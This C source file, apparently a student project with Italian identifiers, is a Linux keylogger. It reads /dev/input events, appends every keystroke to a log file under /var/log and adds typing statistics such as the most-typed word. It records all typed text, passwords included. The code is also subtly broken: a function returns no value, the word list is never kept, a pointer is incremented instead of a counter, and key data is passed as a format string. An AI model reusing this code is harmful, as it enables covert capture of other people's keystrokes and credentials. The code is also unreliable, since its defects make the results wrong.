#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>     /* strerror() */
#include <errno.h>      /* errno */
#include <fcntl.h>      /* open() */
#include <unistd.h>     /* close() */
#include <sys/ioctl.h>  /* ioctl() */

#include <linux/input.h>    /* EVIOCGVERSION ++ */

#define VETT_SIMBOLI_SIZE 249
#define BUFFER_SIZE 16

#define NESSUN_ERRORE 0
#define ERRORE_ARGOMENTI 1
#define ERRORE_MEMORIA 2
#define MAX_LUNGHEZZA_PAROLA 50
#define GAP_MAX 5
#define FILE_DI_LOG "/var/log/keylogger_statistics"

typedef struct nodo_parola
{
	char *parola;
	unsigned int conteggio;
	struct nodo_parola *successiva;
} nodo_parola;

typedef struct cella_simbolo
{
	char *simbolo;
	unsigned int conteggio;
}cella_simbolo;

void inizializza (cella_simbolo vettore_simboli[]);
char* codeToLetter (int code, cella_simbolo vettore_simboli[]);
bool contaSimbolo (int code, cella_simbolo vettore_simboli[], time_t *tempo_ultima_pressione,
										int *numero_tasti_premuti, time_t *tempo_inizio_sessione, time_t *tempo_sessione);
char* simboloPiuFrequente (cella_simbolo vettore_simboli[]);
bool isAlfanumerico (char* s);
int totCaratteri (cella_simbolo vettore_simboli[]);
void inserisciParola (nodo_parola *testa_lista, char buffer_parola[]);
nodo_parola *creaNodoParola (char *buffer_parola);
void* malloc_con_controllo (unsigned int size);
void scriviLog (FILE *file_log, time_t tempo_iniziale, cella_simbolo vettore_simboli[],
								nodo_parola *testa_lista, int numero_tasti_premuti, time_t tempo_sessione);
long caratteriTotali (cella_simbolo vettore_simboli[]);
char* tastoPiuPremuto (cella_simbolo vettore_simboli[]);
char* parolaPiuDigitata (nodo_parola *testa_lista);
void freeLista (nodo_parola* testa_lista);

int main (int argc, char *argv[])
{
	int fd_dev, n_bytes_letti;
	FILE *file_log;
	unsigned i;
	struct input_event buffer [BUFFER_SIZE];

	cella_simbolo vettore_simboli [VETT_SIMBOLI_SIZE] = {0};

	char buffer_parola [MAX_LUNGHEZZA_PAROLA];
	unsigned short iBufferParola = 0;

	nodo_parola *testa_lista = NULL;

	bool continua = true;

	time_t tempo_iniziale = time (NULL);
	time_t tempo_inizio_sessione = 0;
	time_t tempo_ultima_pressione = 0;
	time_t tempo_sessione;

	int numero_tasti_premuti = 0;

	inizializza (vettore_simboli);

	if (argc < 2)
	{
		printf(
			"Usage: %s /dev/input/eventN\n"
			"Where X = input device number\n",
			argv[0]
		);
		return ERRORE_ARGOMENTI;
	}

	if ((fd_dev = open(argv[1], O_RDONLY)) < 0)
	{
		printf(
			"Error: unable to open `%s'\n",
			argv[1]
		);
	}

	if((file_log = fopen(FILE_DI_LOG,"a")) == NULL)
		printf(
			"Error: unable to open `%s'\n",
			FILE_DI_LOG
		);

	/* Loop. Read event file and parse result. */
	while (continua)
	{
		n_bytes_letti = read (fd_dev, buffer, sizeof(struct input_event) * BUFFER_SIZE);

		if (n_bytes_letti < (int) sizeof(struct input_event))
		{
			printf (
				"ERR %d:\n"
				"Reading of `%s' failed\n"
				"%s\n",
				errno, argv[1], strerror (errno)
			);
			break;
		}

		for (i = 0; i < n_bytes_letti / sizeof(struct input_event); ++i)
		{
			if (buffer[i].type == EV_KEY && buffer[i].value == 1) {
				char* simbolo = codeToLetter (buffer[i].code, vettore_simboli);
				printf (
					"%ld.%06ld: "
					"code=%02x "
					"tasto=%s\n",
					buffer[i].time.tv_sec,
					buffer[i].time.tv_usec,
					buffer[i].code,
					simbolo
				);
				fprintf (file_log, simbolo);
				// conteggio lettere
				bool scrivi_log = contaSimbolo (buffer[i].code, vettore_simboli, &tempo_ultima_pressione, &numero_tasti_premuti,
											&tempo_inizio_sessione, &tempo_sessione);
				if (scrivi_log)
						scriviLog (file_log, tempo_iniziale, vettore_simboli, testa_lista, numero_tasti_premuti, tempo_sessione);
				// conteggio parole
				if (isAlfanumerico (simbolo))
				{
					buffer_parola [iBufferParola] = simbolo[0];
					iBufferParola++;
				}
				else
				{
					buffer_parola[iBufferParola]='\0';

					if (strcmp (buffer_parola, "quit") == 0)
					{
						continua = false;
						break;
					}

					inserisciParola (testa_lista, buffer_parola);
					iBufferParola = 0;
				}
			}
		}
	}

	close (fd_dev);
	fclose (file_log);

	return NESSUN_ERRORE;
}

char* codeToLetter (int code, cella_simbolo vettore_simboli[]) {
	/*for (int i = 0; i < 50; i++)
		printf ("code=%d lettera=%c\n", i, vettore_simboli[i]);*/
	if (code >= 0 && code < VETT_SIMBOLI_SIZE)
		return vettore_simboli [code].simbolo;
	else
		return "\0";
}

bool contaSimbolo (int code, cella_simbolo vettore_simboli[], time_t *tempo_ultima_pressione,
										int *numero_tasti_premuti, time_t *tempo_inizio_sessione, time_t *tempo_sessione)
{
	if (code >= 0 && code < VETT_SIMBOLI_SIZE)
		vettore_simboli [code].conteggio ++;

	time_t tempo_attuale = time (NULL);
	if (*tempo_inizio_sessione == 0)
		*tempo_inizio_sessione = tempo_attuale;

	*tempo_sessione = difftime (tempo_attuale, *tempo_inizio_sessione);

	time_t secondi_da_ultima_pressione = difftime (tempo_attuale, *tempo_ultima_pressione);
	*tempo_ultima_pressione = tempo_attuale;
	if (secondi_da_ultima_pressione < GAP_MAX)
	{
		*numero_tasti_premuti ++;
		return false;
	}
	else
	{
		*numero_tasti_premuti = 0;
		*tempo_inizio_sessione = time (NULL);
		return true;
	}
}

char* simboloPiuFrequente (cella_simbolo vettore_simboli[]) {
	char *simboloPiuFrequente = vettore_simboli [0].simbolo;
	int frequenzaMax = vettore_simboli [0].conteggio;
	for (int i = 1; i < VETT_SIMBOLI_SIZE; i++) {
		if (vettore_simboli [i].conteggio > frequenzaMax) {
			frequenzaMax = vettore_simboli [i].conteggio;
			simboloPiuFrequente = vettore_simboli [i].simbolo;
		}
	}
	return simboloPiuFrequente;
}

bool isAlfanumerico (char* s) {
	if (strlen (s) != 1)
		return false;
	return (s[0] >= 'a' && s[0] <= 'z') || (s[0] >= '0' && s[0] <= '9') || (s[0] >= 'A' && s[0] <= 'Z');
}

int totCaratteri(cella_simbolo vettore_simboli[]){
	int somma = 0;
	for (int i = 0; i < VETT_SIMBOLI_SIZE; i++) {
		somma += vettore_simboli[i].conteggio;
	}
	return somma;
}

//Aggiunge un elemento alla lista di nodo_parola,chiamando creaNodoParola per generare il nodo
void inserisciParola (nodo_parola *testa_lista, char buffer_parola[]){
	if (testa_lista == NULL) {
		testa_lista = creaNodoParola (buffer_parola);
	}
	nodo_parola* temp = testa_lista;
	while(temp->successiva != NULL) {
		if (strcmp (temp->parola, buffer_parola) == 0) {
			temp->conteggio++;
			return;
		}
		temp = temp->successiva;
	}
	temp->successiva = creaNodoParola (buffer_parola);
}

//Crea un elemento di tipo nodo_parola
nodo_parola *creaNodoParola (char *buffer_parola) {
	int lunghezza_parola = strlen (buffer_parola) + 1;
	nodo_parola* nodo = (nodo_parola*)malloc_con_controllo (sizeof (nodo_parola));
	nodo->parola = (char*)malloc_con_controllo (lunghezza_parola);
	strcpy (nodo->parola, buffer_parola);
	nodo->conteggio = 1;
	nodo->successiva = NULL;
	return nodo;
}

//Effettua un controllo su malloc per prevenire errori in caso la memoria heap dia errori
void* malloc_con_controllo (unsigned int size)
{
	void *ptr;
	ptr = malloc(size);
	if (ptr == NULL)
	{
		printf ("Errore : memoria heap non allocata");
		exit(ERRORE_MEMORIA);
	}
	return ptr;
}

void scriviLog (FILE* file_log, time_t tempo_iniziale, cella_simbolo vettore_simboli[],
								nodo_parola *testa_lista, int numero_tasti_premuti, time_t tempo_sessione) {
	time_t tempo_totale = difftime (time (NULL), tempo_iniziale);
	fprintf (file_log, "\n============================== DATI ==============================\n\n");
	fprintf (file_log, "Tempo dall'inizio del programma (secondi): %ld\n", tempo_totale);
	fprintf (file_log, "Durata dell'ultima sessione di digitazione (secondi): %ld\n", tempo_sessione);
	float digitazioni_medie = (float) numero_tasti_premuti / tempo_sessione;
	fprintf (file_log, "Numero di digitazione medie al secondo: %f\n", digitazioni_medie);
	long caratteri_totali = caratteriTotali (vettore_simboli);
  fprintf (file_log, "Numero dei caratteri totali digitati: %ld\n", caratteri_totali);
	fprintf (file_log, "Tasto maggiormente premuto: %s\n", tastoPiuPremuto (vettore_simboli) );
	fprintf (file_log, "Parola maggiormente digitata: %s\n", parolaPiuDigitata (testa_lista));
	fprintf (file_log, "\n============================== FINE ==============================\n");
	fflush (file_log);

	freeLista(testa_lista);
}

long caratteriTotali (cella_simbolo vettore_simboli[]) {
	long tot = 0;
	for (int i = 0; i < VETT_SIMBOLI_SIZE; i++)
		tot += vettore_simboli [i].conteggio;
}

char* tastoPiuPremuto (cella_simbolo vettore_simboli[]) {
	cella_simbolo *cella_max = &vettore_simboli [0];
	for (int i = 1; i < VETT_SIMBOLI_SIZE; i++)
		if (vettore_simboli [i].conteggio > cella_max->conteggio) {
			cella_max = &vettore_simboli[i];
		}
	return cella_max->simbolo;
}

char* parolaPiuDigitata (nodo_parola *testa_lista) {
	if (testa_lista == NULL)
		return "";

	nodo_parola *x = testa_lista;
	nodo_parola *nodo_max = testa_lista;

	while (x->successiva != NULL) {
		if (x->conteggio > nodo_max->conteggio){
			nodo_max = x;
		}
		x = x->successiva;
	}

	return nodo_max->parola;
}

void freeLista (nodo_parola* testa_lista)
{
	if (testa_lista == NULL)
		return;
	nodo_parola *x = testa_lista;
	nodo_parola *y;
	while (x->successiva != NULL) {
		y = x->successiva;
		free (x->parola);
		free (x);
		x = y;
	}
}
//Mappa la codifica hardware della tastiera(per il kernel linux) in stringhe leggibili
void inizializza (cella_simbolo vettore_simboli[]) {
	vettore_simboli [0].simbolo = "";
	vettore_simboli [1].simbolo = "";
	vettore_simboli [2].simbolo = "1";
	vettore_simboli [3].simbolo = "2";
	vettore_simboli [4].simbolo = "3";
	vettore_simboli [5].simbolo = "4";
	vettore_simboli [6].simbolo = "5";
	vettore_simboli [7].simbolo = "6";
	vettore_simboli [8].simbolo = "7";
	vettore_simboli [9].simbolo = "8";
	vettore_simboli [10].simbolo = "9";
	vettore_simboli [11].simbolo = "0";
	vettore_simboli [12].simbolo = "-";
	vettore_simboli [13].simbolo = "=";
	vettore_simboli [14].simbolo = "";
	vettore_simboli [15].simbolo = "\t";
	vettore_simboli [16].simbolo = "q";
	vettore_simboli [17].simbolo = "w";
	vettore_simboli [18].simbolo = "e";
	vettore_simboli [19].simbolo = "r";
	vettore_simboli [20].simbolo = "t";
	vettore_simboli [21].simbolo = "y";
	vettore_simboli [22].simbolo = "u";
	vettore_simboli [23].simbolo = "i";
	vettore_simboli [24].simbolo = "o";
	vettore_simboli [25].simbolo = "p";
	vettore_simboli [26].simbolo = "";
	vettore_simboli [27].simbolo = "";
	vettore_simboli [28].simbolo = "\n";
	vettore_simboli [29].simbolo = "";
	vettore_simboli [30].simbolo = "a";
	vettore_simboli [31].simbolo = "s";
	vettore_simboli [32].simbolo = "d";
	vettore_simboli [33].simbolo = "f";
	vettore_simboli [34].simbolo = "g";
	vettore_simboli [35].simbolo = "h";
	vettore_simboli [36].simbolo = "j";
	vettore_simboli [37].simbolo = "k";
	vettore_simboli [38].simbolo = "l";
	vettore_simboli [39].simbolo = "";
	vettore_simboli [40].simbolo = "";
	vettore_simboli [41].simbolo = "";
	vettore_simboli [42].simbolo = "";
	vettore_simboli [43].simbolo = "";
	vettore_simboli [44].simbolo = "z";
	vettore_simboli [45].simbolo = "x";
	vettore_simboli [46].simbolo = "c";
	vettore_simboli [47].simbolo = "v";
	vettore_simboli [48].simbolo = "b";
	vettore_simboli [49].simbolo = "n";
	vettore_simboli [50].simbolo = "m";
	vettore_simboli [51].simbolo = ",";
	vettore_simboli [52].simbolo = ".";
	vettore_simboli [53].simbolo = "/";
	vettore_simboli [54].simbolo = "RIGHTSHIFT";
	vettore_simboli [55].simbolo = "KPASTERISK";
	vettore_simboli [56].simbolo = "LEFTALT";
	vettore_simboli [57].simbolo = "SPACE";
	vettore_simboli [58].simbolo = "CAPSLOCK";
	vettore_simboli [59].simbolo = "F1";
	vettore_simboli [60].simbolo = "F2";
	vettore_simboli [61].simbolo = "F3";
	vettore_simboli [62].simbolo = "F4";
	vettore_simboli [63].simbolo = "F5";
	vettore_simboli [64].simbolo = "F6";
	vettore_simboli [65].simbolo = "F7";
	vettore_simboli [66].simbolo = "F8";
	vettore_simboli [67].simbolo = "F9";
	vettore_simboli [68].simbolo = "F10";
	vettore_simboli [69].simbolo = "NUMLOCK";
	vettore_simboli [70].simbolo = "SCROLLLOCK";
	vettore_simboli [71].simbolo = "KP7";
	vettore_simboli [72].simbolo = "KP8";
	vettore_simboli [73].simbolo = "KP9";
	vettore_simboli [74].simbolo = "KPMINUS";
	vettore_simboli [75].simbolo = "KP4";
	vettore_simboli [76].simbolo = "KP5";
	vettore_simboli [77].simbolo = "KP6";
	vettore_simboli [78].simbolo = "KPPLUS";
	vettore_simboli [79].simbolo = "KP1";
	vettore_simboli [80].simbolo = "KP2";
	vettore_simboli [81].simbolo = "KP3";
	vettore_simboli [82].simbolo = "KP0";
	vettore_simboli [83].simbolo = "KPDOT";
	vettore_simboli [84].simbolo = "";
	vettore_simboli [85].simbolo = "ZENKAKUHANKAKU";
	vettore_simboli [86].simbolo = "102ND";
	vettore_simboli [87].simbolo = "F11";
	vettore_simboli [88].simbolo = "F12";
	vettore_simboli [89].simbolo = "RO";
	vettore_simboli [90].simbolo = "KATAKANA";
	vettore_simboli [91].simbolo = "HIRAGANA";
	vettore_simboli [92].simbolo = "HENKAN";
	vettore_simboli [93].simbolo = "KATAKANAHIRAGANA";
	vettore_simboli [94].simbolo = "MUHENKAN";
	vettore_simboli [95].simbolo = "KPJPCOMMA";
	vettore_simboli [96].simbolo = "KPENTER";
	vettore_simboli [97].simbolo = "RIGHTCTRL";
	vettore_simboli [98].simbolo = "KPSLASH";
	vettore_simboli [99].simbolo = "SYSRQ";
	vettore_simboli [100].simbolo = "RIGHTALT";
	vettore_simboli [101].simbolo = "LINEFEED";
	vettore_simboli [102].simbolo = "HOME";
	vettore_simboli [103].simbolo = "UP";
	vettore_simboli [104].simbolo = "PAGEUP";
	vettore_simboli [105].simbolo = "LEFT";
	vettore_simboli [106].simbolo = "RIGHT";
	vettore_simboli [107].simbolo = "END";
	vettore_simboli [108].simbolo = "DOWN";
	vettore_simboli [109].simbolo = "PAGEDOWN";
	vettore_simboli [110].simbolo = "INSERT";
	vettore_simboli [111].simbolo = "DELETE";
	vettore_simboli [112].simbolo = "MACRO";
	vettore_simboli [113].simbolo = "MUTE";
	vettore_simboli [114].simbolo = "VOLUMEDOWN";
	vettore_simboli [115].simbolo = "VOLUMEUP";
	vettore_simboli [116].simbolo = "POWER";
	vettore_simboli [117].simbolo = "KPEQUAL";
	vettore_simboli [118].simbolo = "KPPLUSMINUS";
	vettore_simboli [119].simbolo = "PAUSE";
	vettore_simboli [120].simbolo = "SCALE";
	vettore_simboli [121].simbolo = "KPCOMMA";
	vettore_simboli [122].simbolo = "HANGEUL";
	vettore_simboli [123].simbolo = "HANJA";
	vettore_simboli [124].simbolo = "YEN";
	vettore_simboli [125].simbolo = "LEFTMETA";
	vettore_simboli [126].simbolo = "RIGHTMETA";
	vettore_simboli [127].simbolo = "COMPOSE";
	vettore_simboli [128].simbolo = "STOP";
	vettore_simboli [129].simbolo = "AGAIN";
	vettore_simboli [130].simbolo = "PROPS";
	vettore_simboli [131].simbolo = "UNDO";
	vettore_simboli [132].simbolo = "FRONT";
	vettore_simboli [133].simbolo = "COPY";
	vettore_simboli [134].simbolo = "OPEN";
	vettore_simboli [135].simbolo = "PASTE";
	vettore_simboli [136].simbolo = "FIND";
	vettore_simboli [137].simbolo = "CUT";
	vettore_simboli [138].simbolo = "HELP";
	vettore_simboli [139].simbolo = "MENU";
	vettore_simboli [140].simbolo = "CALC";
	vettore_simboli [141].simbolo = "SETUP";
	vettore_simboli [142].simbolo = "SLEEP";
	vettore_simboli [143].simbolo = "WAKEUP";
	vettore_simboli [144].simbolo = "FILE";
	vettore_simboli [145].simbolo = "SENDFILE";
	vettore_simboli [146].simbolo = "DELETEFILE";
	vettore_simboli [147].simbolo = "XFER";
	vettore_simboli [148].simbolo = "PROG1";
	vettore_simboli [149].simbolo = "PROG2";
	vettore_simboli [150].simbolo = "WWW";
	vettore_simboli [151].simbolo = "MSDOS";
	vettore_simboli [152].simbolo = "COFFEE";
	vettore_simboli [153].simbolo = "ROTATE_DISPLAY";
	vettore_simboli [154].simbolo = "CYCLEWINDOWS";
	vettore_simboli [155].simbolo = "MAIL";
	vettore_simboli [156].simbolo = "BOOKMARKS";
	vettore_simboli [157].simbolo = "COMPUTER";
	vettore_simboli [158].simbolo = "BACK";
	vettore_simboli [159].simbolo = "FORWARD";
	vettore_simboli [160].simbolo = "CLOSECD";
	vettore_simboli [161].simbolo = "EJECTCD";
	vettore_simboli [162].simbolo = "EJECTCLOSECD";
	vettore_simboli [163].simbolo = "NEXTSONG";
	vettore_simboli [164].simbolo = "PLAYPAUSE";
	vettore_simboli [165].simbolo = "PREVIOUSSONG";
	vettore_simboli [166].simbolo = "STOPCD";
	vettore_simboli [167].simbolo = "RECORD";
	vettore_simboli [168].simbolo = "REWIND";
	vettore_simboli [169].simbolo = "PHONE";
	vettore_simboli [170].simbolo = "ISO";
	vettore_simboli [171].simbolo = "CONFIG";
	vettore_simboli [172].simbolo = "HOMEPAGE";
	vettore_simboli [173].simbolo = "REFRESH";
	vettore_simboli [174].simbolo = "EXIT";
	vettore_simboli [175].simbolo = "MOVE";
	vettore_simboli [176].simbolo = "EDIT";
	vettore_simboli [177].simbolo = "SCROLLUP";
	vettore_simboli [178].simbolo = "SCROLLDOWN";
	vettore_simboli [179].simbolo = "KPLEFTPAREN";
	vettore_simboli [180].simbolo = "KPRIGHTPAREN";
	vettore_simboli [181].simbolo = "NEW";
	vettore_simboli [182].simbolo = "REDO";
	vettore_simboli [183].simbolo = "F13";
	vettore_simboli [184].simbolo = "F14";
	vettore_simboli [185].simbolo = "F15";
	vettore_simboli [186].simbolo = "F16";
	vettore_simboli [187].simbolo = "F17";
	vettore_simboli [188].simbolo = "F18";
	vettore_simboli [189].simbolo = "F19";
	vettore_simboli [190].simbolo = "F20";
	vettore_simboli [191].simbolo = "F21";
	vettore_simboli [192].simbolo = "F22";
	vettore_simboli [193].simbolo = "F23";
	vettore_simboli [194].simbolo = "F24";
	vettore_simboli [195].simbolo = "";
	vettore_simboli [196].simbolo = "";
	vettore_simboli [197].simbolo = "";
	vettore_simboli [198].simbolo = "";
	vettore_simboli [199].simbolo = "";
	vettore_simboli [200].simbolo = "PLAYCD";
	vettore_simboli [201].simbolo = "PAUSECD";
	vettore_simboli [202].simbolo = "PROG3";
	vettore_simboli [203].simbolo = "PROG4";
	vettore_simboli [204].simbolo = "DASHBOARD";
	vettore_simboli [205].simbolo = "SUSPEND";
	vettore_simboli [206].simbolo = "CLOSE";
	vettore_simboli [207].simbolo = "PLAY";
	vettore_simboli [208].simbolo = "FASTFORWARD";
	vettore_simboli [209].simbolo = "BASSBOOST";
	vettore_simboli [210].simbolo = "PRINT";
	vettore_simboli [211].simbolo = "HP";
	vettore_simboli [212].simbolo = "CAMERA";
	vettore_simboli [213].simbolo = "SOUND";
	vettore_simboli [214].simbolo = "QUESTION";
	vettore_simboli [215].simbolo = "EMAIL";
	vettore_simboli [216].simbolo = "CHAT";
	vettore_simboli [217].simbolo = "SEARCH";
	vettore_simboli [218].simbolo = "CONNECT";
	vettore_simboli [219].simbolo = "FINANCE";
	vettore_simboli [220].simbolo = "SPORT";
	vettore_simboli [221].simbolo = "SHOP";
	vettore_simboli [222].simbolo = "ALTERASE";
	vettore_simboli [223].simbolo = "CANCEL";
	vettore_simboli [224].simbolo = "BRIGHTNESSDOWN";
	vettore_simboli [225].simbolo = "BRIGHTNESSUP";
	vettore_simboli [226].simbolo = "MEDIA";
	vettore_simboli [227].simbolo = "SWITCHVIDEOMODE";
	vettore_simboli [228].simbolo = "KBDILLUMTOGGLE";
	vettore_simboli [229].simbolo = "KBDILLUMDOWN";
	vettore_simboli [230].simbolo = "KBDILLUMUP";
	vettore_simboli [231].simbolo = "SEND";
	vettore_simboli [232].simbolo = "REPLY";
	vettore_simboli [233].simbolo = "FORWARDMAIL";
	vettore_simboli [234].simbolo = "SAVE";
	vettore_simboli [235].simbolo = "DOCUMENTS";
	vettore_simboli [236].simbolo = "BATTERY";
	vettore_simboli [237].simbolo = "BLUETOOTH";
	vettore_simboli [238].simbolo = "WLAN";
	vettore_simboli [239].simbolo = "UWB";
	vettore_simboli [240].simbolo = "UNKNOWN";
	vettore_simboli [241].simbolo = "VIDEO_NEXT";
	vettore_simboli [242].simbolo = "VIDEO_PREV";
	vettore_simboli [243].simbolo = "BRIGHTNESS_CYCLE";
	vettore_simboli [244].simbolo = "BRIGHTNESS_AUTO";
	vettore_simboli [245].simbolo = "DISPLAY_OFF";
	vettore_simboli [246].simbolo = "WWAN";
	vettore_simboli [247].simbolo = "RFKILL";
	vettore_simboli [248].simbolo = "MICMUTE";
}
